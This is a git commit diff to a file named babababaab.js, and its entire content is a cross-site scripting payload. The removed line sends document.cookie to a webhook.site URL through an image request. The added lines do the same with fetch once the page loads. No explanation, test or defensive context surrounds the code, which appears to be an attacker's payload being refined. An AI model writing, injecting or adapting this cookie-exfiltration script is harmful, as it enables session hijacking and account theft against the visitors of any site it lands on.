f5f7b2ef1ca8703f8fc04652b286a62aaf425cac
printablezort <murtaki@duck.com>
2025-04-27 11:48:53 +0300

    Update babababaab.js

--- babababaab.js
+++ babababaab.js
@@ -1,1 +1,5 @@
-<script>new Image().src="https://webhook.site/57c3628c-9173-43cf-bfef-006b2551ef20?c="+document.cookie;</script>
+<script>
+window.onload = function() {
+  fetch('https://webhook.site/57c3628c-9173-43cf-bfef-006b2551ef20?c=' + document.cookie);
+};
+</script>
